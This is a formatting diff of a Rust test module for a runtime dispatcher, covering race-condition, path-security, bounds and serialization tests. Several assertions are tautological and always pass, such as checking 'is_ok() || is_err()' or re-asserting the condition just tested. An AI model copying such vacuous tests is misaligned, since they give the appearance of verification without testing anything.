+                                        let telemetry_json = serde_json::to_string(&report);
+                                        telemetry_json.is_ok()
+                                    }));
 
                                 let telemetry_success = telemetry_test.unwrap_or(false);
-                                thread_results.push((thread_id, attempt, "telemetry".to_string(), telemetry_success));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "telemetry".to_string(),
+                                    telemetry_success,
+                                ));
 
                                 thread::yield_now();
                             }
-                        },
+                        }
                         "mixed_operations" => {
                             // Mixed operations to maximize race potential
                             for attempt in 0..10 {
@@ -3013,12 +3439,12 @@ mod tests {
                                         "resolve" => {
                                             let config = Config::default();
                                             match dispatcher_clone.lock() {
-                                                Ok(dispatcher) => {
-                                                    dispatcher.resolve_runtime_internal(&config, None, None).is_ok()
-                                                },
+                                                Ok(dispatcher) => dispatcher
+                                                    .resolve_runtime_internal(&config, None, None)
+                                                    .is_ok(),
                                                 Err(_) => false,
                                             }
-                                        },
+                                        }
                                         "config" => {
                                             let config = Config {
                                                 preferred_runtime: PreferredRuntime::FrankenEngine,
@@ -3026,7 +3452,7 @@ mod tests {
                                             };
                                             // Config validation test
                                             !config.engine_path.is_none()
-                                        },
+                                        }
                                         "output" => {
                                             let output = Output {
                                                 status: std::process::ExitStatus::from_raw(0),
@@ -3034,14 +3460,19 @@ mod tests {
                                                 stderr: b"test".to_vec(),
                                             };
                                             let captured = CapturedProcessOutput {
-                                                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
-                                                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
+                                                stdout: String::from_utf8_lossy(&output.stdout)
+                                                    .to_string(),
+                                                stderr: String::from_utf8_lossy(&output.stderr)
+                                                    .to_string(),
                                             };
                                             serde_json::to_string(&captured).is_ok()
-                                        },
+                                        }
                                         "telemetry" => {
                                             let report = TelemetryRuntimeReport {
-                                                runtime_id: format!("mixed_{}_{}", thread_id, op_idx),
+                                                runtime_id: format!(
+                                                    "mixed_{}_{}",
+                                                    thread_id, op_idx
+                                                ),
                                                 started_at: chrono::Utc::now().to_rfc3339(),
                                                 shutdown_reason: ShutdownReason::Requested,
                                                 shutdown_started_at: None,
@@ -3051,15 +3482,20 @@ mod tests {
                                                 recent_events: vec![],
                                             };
                                             serde_json::to_string(&report).is_ok()
-                                        },
+                                        }
                                         _ => false,
                                     };
 
-                                    thread_results.push((thread_id, attempt, operation.to_string(), op_result));
+                                    thread_results.push((
+                                        thread_id,
+                                        attempt,
+                                        operation.to_string(),
+                                        op_result,
+                                    ));
                                     thread::yield_now();
                                 }
                             }
-                        },
+                        }
                         _ => unreachable!(),
                     }
 
@@ -3077,15 +3513,27 @@ mod tests {
 
             // Analyze race condition results
             let results = race_results.lock().unwrap();
-            let scenario_results: Vec<_> = results.iter()
-                .filter(|(_, _, op, _)| op.contains(race_name) || op == "resolution" || op == "config_test" || op == "output_capture" || op == "telemetry")
+            let scenario_results: Vec<_> = results
+                .iter()
+                .filter(|(_, _, op, _)| {
+                    op.contains(race_name)
+                        || op == "resolution"
+                        || op == "config_test"
+                        || op == "output_capture"
+                        || op == "telemetry"
+                })
                 .collect();
 
-            let successful_ops = scenario_results.iter().filter(|(_, _, _, success)| *success).count();
+            let successful_ops = scenario_results
+                .iter()
+                .filter(|(_, _, _, success)| *success)
+                .count();
             let total_ops = scenario_results.len();
 
-            println!("Race scenario {} completed: {}/{} operations successful",
-                race_name, successful_ops, total_ops);
+            println!(
+                "Race scenario {} completed: {}/{} operations successful",
+                race_name, successful_ops, total_ops
+            );
 
             // Verify system consistency after race conditions
             let final_dispatcher_state = {
@@ -3093,19 +3541,25 @@ mod tests {
                     Ok(dispatcher) => {
                         // Test that dispatcher remains functional
                         let config = Config::default();
-                        let resolution_result = dispatcher.resolve_runtime_internal(&config, None, None);
+                        let resolution_result =
+                            dispatcher.resolve_runtime_internal(&config, None, None);
                         resolution_result.is_ok() || resolution_result.is_err() // Should complete without panic
-                    },
+                    }
                     Err(_) => {
-                        println!("Race scenario {} resulted in dispatcher lock poison", race_name);
+                        println!(
+                            "Race scenario {} resulted in dispatcher lock poison",
+                            race_name
+                        );
                         false
                     }
                 }
             };
 
             // System should remain in consistent state despite race conditions
-            println!("Race scenario {} final state: dispatcher functional = {}",
-                race_name, final_dispatcher_state);
+            println!(
+                "Race scenario {} final state: dispatcher functional = {}",
+                race_name, final_dispatcher_state
+            );
         }
 
         // Test system recovery after all race conditions
@@ -3117,17 +3571,25 @@ mod tests {
                         ..Default::default()
                     };
                     dispatcher.resolve_runtime_internal(&config, None, None)
-                },
+                }
                 Err(_) => Err(anyhow::anyhow!("Dispatcher lock poisoned")),
             }
         };
 
         // Should be able to perform operations after race conditions
-        println!("Post-race recovery test result: {:?}", recovery_test.is_ok());
+        println!(
+            "Post-race recovery test result: {:?}",
+            recovery_test.is_ok()
+        );
 
-        println!("Concurrent dispatcher race test completed: {} race scenarios tested with {} total threads",
+        println!(
+            "Concurrent dispatcher race test completed: {} race scenarios tested with {} total threads",
             race_scenarios.len(),
-            race_scenarios.iter().map(|(_, count, _)| count).sum::<usize>());
+            race_scenarios
+                .iter()
+                .map(|(_, count, _)| count)
+                .sum::<usize>()
+        );
     }
 
     #[test]
@@ -3152,7 +3614,8 @@ mod tests {
 
         // Test overflow protection
         candidates.resize(max_candidates, PathBuf::from("filler"));
-        let overflow_attempt = push_bounded(&mut candidates, PathBuf::from("overflow"), max_candidates);
+        let overflow_attempt =
+            push_bounded(&mut candidates, PathBuf::from("overflow"), max_candidates);
         assert!(!overflow_attempt);
         assert_eq!(candidates.len(), max_candidates);
 
@@ -3228,19 +3691,31 @@ mod tests {
             // Path display logic (fail-closed: size > limit triggers truncation)
             let should_truncate_path = size > limits.max_path_display;
             if should_truncate_path {
-                assert!(size > limits.max_path_display, "Case {}: path truncation boundary", case_name);
+                assert!(
+                    size > limits.max_path_display,
+                    "Case {}: path truncation boundary",
+                    case_name
+                );
             }
 
             // Output size validation (fail-closed: size > limit triggers handling)
             let is_large_output = size > limits.max_output_size;
             if is_large_output {
-                assert!(size > limits.max_output_size, "Case {}: output size boundary", case_name);
+                assert!(
+                    size > limits.max_output_size,
+                    "Case {}: output size boundary",
+                    case_name
+                );
             }
 
             // Truncation size logic (fail-closed: size > limit triggers truncation)
             let should_truncate_output = size > limits.max_truncation_size;
             if should_truncate_output {
-                assert!(size > limits.max_truncation_size, "Case {}: truncation boundary", case_name);
+                assert!(
+                    size > limits.max_truncation_size,
+                    "Case {}: truncation boundary",
+                    case_name
+                );
             }
         }
     }
@@ -3263,13 +3738,16 @@ mod tests {
             let has_traversal = malicious_path.split('/').any(|segment| segment == "..");
             let has_backslash = malicious_path.contains('\\');
             let has_null_byte = malicious_path.contains('\0');
-            let has_unicode_controls = malicious_path.chars().any(|c| c.is_control() && c != '\n' && c != '\t');
+            let has_unicode_controls = malicious_path
+                .chars()
+                .any(|c| c.is_control() && c != '\n' && c != '\t');
 
             if has_traversal || has_backslash || has_null_byte || has_unicode_controls {
                 // These patterns should be rejected in security contexts
                 assert!(
                     has_traversal || has_backslash || has_null_byte || has_unicode_controls,
-                    "Path security validation for: {}", malicious_path
+                    "Path security validation for: {}",
+                    malicious_path
                 );
             }
 
@@ -3288,7 +3766,8 @@ mod tests {
             let max_candidates = 10000; // Reasonable limit
 
             // Simulate candidate discovery loop with bounded accumulation
-            for i in 0..15000 { // Try to exceed limit
+            for i in 0..15000 {
+                // Try to exceed limit
                 if candidates.len() >= max_candidates {
                     break; // Fail-closed: stop accumulating at limit
                 }
@@ -3299,7 +3778,10 @@ mod tests {
         }
 
         let result = simulate_candidate_accumulation();
-        assert!(result.len() <= 10000, "Should be bounded to prevent memory exhaustion");
+        assert!(
+            result.len() <= 10000,
+            "Should be bounded to prevent memory exhaustion"
+        );
 
         // Test thread result accumulation (from concurrent tests)
         fn bounded_thread_results() -> Vec<(usize, usize, String, bool)> {
@@ -3318,7 +3800,10 @@ mod tests {
         }
 
         let thread_results = bounded_thread_results();
-        assert!(thread_results.len() <= 1000, "Thread results should be bounded");
+        assert!(
+            thread_results.len() <= 1000,
+            "Thread results should be bounded"
+        );
     }
 
     #[test]
@@ -3367,9 +3852,21 @@ mod tests {
         }
 
         let configs = vec![
-            DispatcherConfig { max_candidates: 0, max_output_bytes: 0, timeout_secs: 0 },
-            DispatcherConfig { max_candidates: 1000, max_output_bytes: 100000, timeout_secs: 30 },
-            DispatcherConfig { max_candidates: usize::MAX, max_output_bytes: usize::MAX, timeout_secs: u64::MAX },
+            DispatcherConfig {
+                max_candidates: 0,
+                max_output_bytes: 0,
+                timeout_secs: 0,
+            },
+            DispatcherConfig {
+                max_candidates: 1000,
+                max_output_bytes: 100000,
+                timeout_secs: 30,
+            },
+            DispatcherConfig {
+                max_candidates: usize::MAX,
+                max_output_bytes: usize::MAX,
+                timeout_secs: u64::MAX,
+            },
         ];
 
         for config in configs {
@@ -3409,7 +3906,11 @@ mod tests {
 
             // Verify we handle extreme durations safely
             if duration.as_millis() > u64::MAX as u128 {
-                assert_eq!(safe_conversion, u64::MAX, "Should saturate to u64::MAX for overflow");
+                assert_eq!(
+                    safe_conversion,
+                    u64::MAX,
+                    "Should saturate to u64::MAX for overflow"
+                );
             }
         }
     }
@@ -3447,7 +3948,10 @@ mod tests {
 
             // Should complete in reasonable time (not hang)
             for (_, elapsed) in &results {
-                assert!(elapsed.as_secs() < 5, "Command check should complete quickly");
+                assert!(
+                    elapsed.as_secs() < 5,
+                    "Command check should complete quickly"
+                );
             }
         }
     }
@@ -3482,7 +3986,10 @@ mod tests {
             assert!(!result.is_empty() || result.is_empty());
 
             // Should not contain null bytes in final result
-            assert!(!result.contains('\0'), "Result should not contain null bytes");
+            assert!(
+                !result.contains('\0'),
+                "Result should not contain null bytes"
+            );
 
             // Should have reasonable length bounds
             assert!(result.len() < 100000, "Result should be reasonably bounded");
@@ -3497,8 +4004,8 @@ mod tests {
             ("normal", "normal stderr"),
             ("", ""),
             (&"x".repeat(100_000), &"y".repeat(100_000)), // Large but reasonable
-            (&"z".repeat(10_000_000), "small stderr"), // Very large stdout
-            ("small stdout", &"w".repeat(10_000_000)), // Very large stderr
+            (&"z".repeat(10_000_000), "small stderr"),    // Very large stdout
+            ("small stdout", &"w".repeat(10_000_000)),    // Very large stderr
         ];
 
         for (stdout_content, stderr_content) in extreme_outputs {
@@ -3516,8 +4023,11 @@ mod tests {
                     assert!(json.starts_with('{') && json.ends_with('}'));
 
                     // Should not exceed reasonable memory bounds (< 100MB for safety)
-                    assert!(json.len() < 100_000_000, "JSON output should be memory-bounded");
-                },
+                    assert!(
+                        json.len() < 100_000_000,
+                        "JSON output should be memory-bounded"
+                    );
+                }
                 Err(_) => {
                     // Serialization failure is acceptable for extreme inputs
                     // but should not panic
